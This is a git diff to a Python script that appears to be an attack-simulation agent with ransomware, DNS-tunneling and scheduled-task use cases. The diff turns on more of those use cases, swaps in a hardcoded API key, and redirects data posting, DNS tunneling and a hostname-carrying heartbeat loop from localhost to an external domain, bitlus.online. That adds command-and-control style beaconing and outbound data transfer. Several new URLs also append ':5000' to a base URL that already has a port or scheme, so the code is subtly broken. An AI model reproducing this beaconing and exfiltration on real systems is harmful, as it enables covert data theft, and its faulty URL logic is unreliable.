@@ -15,8 +15,8 @@ from datetime import datetime, timedelta
 from cryptography.fernet import Fernet
 import glob 
 #Configurable Variables
-API_KEY = "c2ef2dbfd982a527df1cb3c7028b2e24c1bc1e0b5082031ef51aa491bd9afb0f"  
-USE_CASES = {'ransomware_simulation': True, 'encrypted_traffic': True, 'dns_tunneling': False, 'net_recon': False, 'dll_side_loading': False, 'registry_edits': False, 'scheduled_tasks': False, 'traffic_non_standard_ports': False}
+API_KEY = "c1e142565898f907bce7e0efb9dd0adfe4c0376706a090995edd88bedf584a6d"  
+USE_CASES = {'ransomware_simulation': True, 'dns_tunneling': True, 'scheduled_tasks': True, 'encrypted_traffic': True, 'net_recon': False, 'dll_side_loading': False, 'registry_edits': False, 'traffic_non_standard_ports': False}
 
 heartbeatRate = 11  # in seconds
 
@@ -33,14 +33,34 @@ file_count = 200
 file_prefix = "test_file_"
 file_extension = ".txt"
 
+
+
+
 ##########################
 #### Helper Functions ####
 ##########################
 
+# Helper function to allow both external and localhost calls
+def get_base_url():
+    external_url = "https://www.bitlus.online"
+    local_url = "http://127.0.0.1:5000"
+    try:
+        # Try reaching the external domain
+        response = requests.get(external_url, timeout=2) 
+        if response.status_code == 200:
+            print(f"### External domain '{external_url}' is reachable.")
+            return external_url
+    except requests.RequestException:
+        print(f"### External domain '{external_url}' is not reachable. Falling back to localhost.")
+    # Fallback to localhost
+    print(local_url)
+    return local_url
+base_url = get_base_url()
+
 def data_to_send(data):
     try:
         response = requests.post(
-            "http://127.0.0.1:5000/api/datatosend",
+            f"{base_url}/api/datatosend",
             json={"api_key": API_KEY, "data": data},
         )
         if response.status_code == 200:
@@ -373,7 +393,7 @@ def ransomware_simulation():
 
 def dns_tunneling():
     logging_func("DNS tunneling simulation starting")
-    DNS_TUNNEL_API = "http://127.0.0.1:5000/api/dnstunneling"
+    DNS_TUNNEL_API = f"{base_url}:5000/api/dnstunneling"
     try:
         print("Executing DNS Tunneling Use-Case")
 
@@ -543,7 +563,7 @@ def heart_beat():
         print(hostname)
         while True:
             response = requests.post(
-                "http://127.0.0.1:5000/api/heartbeat",
+                f"{base_url}:5000/api/heartbeat",
                 json={"host_name": hostname, "api_key":API_KEY},
             )
             print(response.raw)
